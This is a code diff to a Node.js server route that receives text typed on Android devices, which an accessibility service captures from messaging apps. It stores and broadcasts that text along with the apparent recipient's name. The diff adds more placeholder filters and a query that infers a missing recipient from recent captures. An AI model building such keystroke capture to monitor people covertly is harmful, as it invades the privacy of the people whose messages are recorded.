@@ -4,7 +4,18 @@ import { broadcast } from '../sse.js'
 import { TEXT_ROLE_PRIORITY } from '../appRoles.js'
 
 const router = Router()
-const IGNORED_TYPED_TEXT = new Set(['message'])
+const IGNORED_TYPED_TEXT = new Set([
+    'message',
+    'type a message',
+    'write a message',
+    'send a message',
+    'ask google',
+])
+const TARGET_INHERIT_MINUTES = 90
+
+function normalizeTypedText(value) {
+    return String(value ?? '').trim().toLowerCase().replace(/\s+/g, ' ').replace(/[.!?…]+$/g, '')
+}
 
 // POST /api/typed-text — called by the Android accessibility service
 router.post('/', async (req, res) => {
@@ -16,16 +27,35 @@ router.post('/', async (req, res) => {
     if (appRole && !TEXT_ROLE_PRIORITY.includes(appRole)) {
         return res.status(400).json({ error: 'Unknown appRole' })
     }
-    if (IGNORED_TYPED_TEXT.has(String(text).trim().toLowerCase())) {
+    if (IGNORED_TYPED_TEXT.has(normalizeTypedText(text))) {
         return res.status(202).json({ status: 'ignored' })
     }
 
     try {
+        let effectiveTarget = targetName ?? ''
+        if (!String(effectiveTarget).trim()) {
+            const captured = new Date(capturedAt)
+            if (!Number.isNaN(captured.getTime())) {
+                const inherited = await db.query(
+                    `SELECT target_name
+                       FROM typed_text
+                      WHERE device_id = $1 AND package_name = $2
+                        AND coalesce(target_name, '') <> ''
+                        AND captured_at >= $3::timestamptz - make_interval(mins => $4)
+                        AND captured_at < $3::timestamptz
+                      ORDER BY captured_at DESC
+                      LIMIT 1`,
+                    [deviceId, packageName, captured.toISOString(), TARGET_INHERIT_MINUTES]
+                )
+                effectiveTarget = inherited.rows[0]?.target_name ?? ''
+            }
+        }
+
         const result = await db.query(
             `INSERT INTO typed_text (device_id, package_name, app_label, target_name, text, captured_at)
              VALUES ($1, $2, $3, $4, $5, $6)
              RETURNING id, device_id, package_name, app_label, target_name, text, captured_at, received_at`,
-            [deviceId, packageName, appLabel ?? '', targetName ?? '', text, capturedAt]
+            [deviceId, packageName, appLabel ?? '', effectiveTarget, text, capturedAt]
         )
         const row = result.rows[0]
         broadcast('typedtext', row)
